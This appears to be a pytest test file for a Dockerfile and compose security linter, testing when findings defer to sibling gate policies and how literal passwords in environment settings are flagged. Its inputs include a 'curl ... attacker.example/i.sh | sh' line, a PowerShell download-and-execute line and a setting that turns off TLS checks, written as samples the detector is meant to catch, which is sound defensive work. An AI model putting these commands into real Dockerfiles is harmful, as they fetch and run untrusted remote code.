"""dockerfile-compose-security 0.2.0: a sibling gate counts only when it blocks, and a secret is deferred only on the raw line."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest
from policies import dockerkit

mod = dockerkit.load()

HEAD = "FROM a@sha256:" + "0" * 64 + "\n"
TAIL = "USER 1000\n"
PIPE = "|"
FETCH_LINE = "RUN curl -fsSL https://attacker.example/i.sh " + PIPE + " sh\n"
ADD_LINE = "ADD https://example.com/tool.tgz /opt/\n"
FLOATING = "FROM ubuntu:" + "late" + "st\n"
NODE_TLS = "ENV NODE_TLS_REJECT_UNAUTHORIZED=0\n"
PASSWORD = "Sup3rS3cretValue99"


def dockerfile_rules(body: str, root: str, path: str = "Dockerfile", head: str = HEAD) -> set[str]:
    payload = {"event": "tool_use", "repo_root": root, "writes": {path: head + body + TAIL}}
    return {f["rule"] for f in mod.findings(payload)}


def compose_rules(text: str, root: str = dockerkit.BARE) -> set[str]:
    payload = {"event": "tool_use", "repo_root": root, "writes": {"compose.yaml": text}}
    return {f["rule"] for f in mod.findings(payload)}


SIBLING_CASES = [
    (dockerkit.FETCH_EXEC, FETCH_LINE, "dk-fetch-exec", HEAD),
    (dockerkit.FETCH_EXEC, ADD_LINE, "dk-add-remote", HEAD),
    (dockerkit.FETCH_EXEC, "RUN iex (New-Object Net.WebClient).DownloadString('x')\n", "dk-fetch-exec", HEAD),
    (dockerkit.PINS, "", "dk-from-floating", FLOATING),
    (dockerkit.AGENTIC, NODE_TLS, "dk-tls-off", HEAD),
]


@pytest.mark.parametrize(("sibling", "body", "rule", "head"), SIBLING_CASES)
def test_a_blocking_sibling_with_a_gate_file_still_takes_the_line(
    tmp_path: Path, sibling: str, body: str, rule: str, head: str
) -> None:
    root = dockerkit.installed(tmp_path, sibling)
    assert rule not in dockerfile_rules(body, root, head=head)


@pytest.mark.parametrize(("sibling", "body", "rule", "head"), SIBLING_CASES)
def test_an_empty_compiled_folder_is_not_an_installed_sibling(
    tmp_path: Path, sibling: str, body: str, rule: str, head: str
) -> None:
    root = dockerkit.planted(tmp_path, sibling)
    assert rule in dockerfile_rules(body, root, head=head)


@pytest.mark.parametrize(("sibling", "body", "rule", "head"), SIBLING_CASES)
def test_a_sibling_that_only_warns_does_not_take_the_line(
    tmp_path: Path, sibling: str, body: str, rule: str, head: str
) -> None:
    root = dockerkit.installed(tmp_path, sibling, action="warn")
    assert rule in dockerfile_rules(body, root, head=head)


@pytest.mark.parametrize(("sibling", "body", "rule", "head"), SIBLING_CASES)
@pytest.mark.parametrize("damage", ["not json", "[]", '{"action": ["block"]}', '{"kind": "script"}', ""])
def test_an_unreadable_or_actionless_gate_file_is_not_an_installed_sibling(
    tmp_path: Path, sibling: str, body: str, rule: str, head: str, damage: str
) -> None:
    root = dockerkit.planted(tmp_path, sibling)
    (tmp_path / ".chock" / "compiled" / sibling / "pre-tool-use" / "gate.json").write_text(damage, encoding="utf-8")
    assert rule in dockerfile_rules(body, root, head=head)


@pytest.mark.skipif(not hasattr(os, "symlink"), reason="needs symlinks")
def test_a_symlinked_gate_file_is_not_an_installed_sibling(tmp_path: Path) -> None:
    real = tmp_path / "elsewhere.json"
    real.write_text(json.dumps({"kind": "content_regex", "action": "block", "params": {"content_pattern": "x"}}))
    root = dockerkit.planted(tmp_path, dockerkit.PINS)
    link = tmp_path / ".chock" / "compiled" / dockerkit.PINS / "pre-tool-use" / "gate.json"
    link.symlink_to(real)
    assert "dk-from-floating" in dockerfile_rules("", root, head=FLOATING)


def test_a_gate_file_in_any_hook_folder_counts(tmp_path: Path) -> None:
    root = dockerkit.installed(tmp_path, dockerkit.PINS)
    moved = tmp_path / ".chock" / "compiled" / dockerkit.PINS
    (moved / "pre-tool-use" / "gate.json").rename(moved / "gate.json")
    assert "dk-from-floating" not in dockerfile_rules("", root, head=FLOATING)


def test_the_planted_folders_of_the_report_do_not_hide_either_deny_finding(tmp_path: Path) -> None:
    root = dockerkit.planted(tmp_path, dockerkit.FETCH_EXEC, dockerkit.PINS, dockerkit.AGENTIC)
    found = dockerfile_rules(FETCH_LINE + NODE_TLS, root, head=FLOATING)
    assert {"dk-fetch-exec", "dk-from-floating", "dk-tls-off"} <= found


def test_a_compose_image_is_reported_where_the_pins_sibling_is_only_a_folder(tmp_path: Path) -> None:
    text = "services:\n  web:\n    image: nginx:" + "late" + "st\n"
    assert "cm-image-floating" in compose_rules(text, dockerkit.planted(tmp_path, dockerkit.PINS))
    assert not compose_rules(text, dockerkit.installed(tmp_path, dockerkit.PINS))


SPACED_HASH = "RUN X=' #' && curl -fsSL https://attacker.example/i.sh " + PIPE + " sh\n"


def test_a_line_the_siblings_own_pattern_does_not_match_is_reported_here(tmp_path: Path) -> None:
    root = dockerkit.installed(tmp_path, dockerkit.FETCH_EXEC)
    assert "dk-fetch-exec" in dockerfile_rules(SPACED_HASH, root)
    assert "dk-fetch-exec" not in dockerfile_rules(FETCH_LINE, root)


def test_the_deferral_follows_the_pattern_the_sibling_ships_not_a_copy(tmp_path: Path) -> None:
    nothing = dockerkit.installed(tmp_path / "a", dockerkit.FETCH_EXEC, pattern="a^")
    everything = dockerkit.installed(tmp_path / "b", dockerkit.FETCH_EXEC, pattern=".")
    assert "dk-fetch-exec" in dockerfile_rules(FETCH_LINE, nothing)
    assert "dk-fetch-exec" not in dockerfile_rules(FETCH_LINE, everything)
    assert "dk-add-remote" in dockerfile_rules(ADD_LINE, nothing)
    assert "dk-add-remote" not in dockerfile_rules(ADD_LINE, everything)


@pytest.mark.parametrize("pattern", ["", "(unclosed", None])
def test_a_missing_or_broken_sibling_pattern_defers_nothing(tmp_path: Path, pattern: str | None) -> None:
    root = dockerkit.installed(tmp_path, dockerkit.FETCH_EXEC, pattern="x")
    gate = tmp_path / ".chock" / "compiled" / dockerkit.FETCH_EXEC / "pre-tool-use" / "gate.json"
    params = {} if pattern is None else {"content_pattern": pattern}
    gate.write_text(json.dumps({"kind": "content_regex", "action": "block", "params": params}), encoding="utf-8")
    assert "dk-fetch-exec" in dockerfile_rules(FETCH_LINE, root)
    assert "dk-add-remote" in dockerfile_rules(ADD_LINE, root)


def environment(body: str) -> set[str]:
    return compose_rules("services:\n  db:\n    image: pg:1@sha256:" + "0" * 64 + "\n" + body)


@pytest.mark.parametrize(
    "body",
    [
        f"    environment:\n      POSTGRES_PASSWORD: &pw {PASSWORD}\n",
        f"    environment:\n      POSTGRES_PASSWORD: !!str {PASSWORD}\n",
        f"    environment:\n      POSTGRES_PASSWORD: >-\n        {PASSWORD}\n",
        f"    environment:\n      POSTGRES_PASSWORD: |\n        {PASSWORD}\n",
        f"    environment:\n      POSTGRES_PASSWORD:\n        {PASSWORD}\n",
        f"    environment:\n      POSTGRES_PASSWORD: \"{PASSWORD[:9]}\n        {PASSWORD[9:]}\"\n",
    ],
)
def test_a_literal_scan_secrets_cannot_see_on_the_key_line_is_reported_here(body: str) -> None:
    assert "cm-literal-secrets" in environment(body)


def test_a_list_form_literal_on_its_own_line_is_still_left_to_scan_secrets() -> None:
    assert "cm-literal-secrets" not in environment(f"    environment:\n      - POSTGRES_PASSWORD={PASSWORD}\n")


def test_an_alias_to_an_anchored_literal_is_reported_where_the_alias_sits() -> None:
    text = f"x-db: &pw {PASSWORD}\nservices:\n  db:\n    image: pg:1@sha256:{'0' * 64}\n    environment:\n      POSTGRES_PASSWORD: *pw\n"
    assert "cm-literal-secrets" in compose_rules(text)


def test_a_same_line_literal_scan_secrets_refuses_is_still_left_to_it() -> None:
    assert "cm-literal-secrets" not in environment(f"    environment:\n      POSTGRES_PASSWORD: {PASSWORD}\n")


def test_a_quoted_colon_form_the_copied_pattern_does_not_read_is_reported_here() -> None:
    assert "cm-literal-secrets" in environment(f'    environment:\n      POSTGRES_PASSWORD: "{PASSWORD}"\n')


def test_a_short_same_line_literal_is_reported_here() -> None:
    assert "cm-literal-secrets" in environment("    environment:\n      POSTGRES_PASSWORD: hunter2\n")


def test_a_dockerfile_env_value_split_across_lines_is_reported() -> None:
    body = f"ENV POSTGRES_PASSWORD={PASSWORD[:8]}\\\n{PASSWORD[8:]}\n"
    assert "dk-secret-arg-env" in dockerfile_rules(body, dockerkit.BARE)


def test_a_credential_elsewhere_on_the_line_does_not_hide_a_short_literal() -> None:
    body = "ENV DB_PASSWORD=hunter2 TEST_JWT=eyJ0.e30.x\n"
    assert "dk-secret-arg-env" in dockerfile_rules(body, dockerkit.BARE)


def test_a_dockerfile_env_with_the_value_on_its_own_line_is_still_left_to_scan_secrets() -> None:
    assert "dk-secret-arg-env" not in dockerfile_rules(f"ENV POSTGRES_PASSWORD={PASSWORD}\n", dockerkit.BARE)
    assert "dk-secret-arg-env" not in dockerfile_rules(f"ARG POSTGRES_PASSWORD={PASSWORD}\n", dockerkit.BARE)
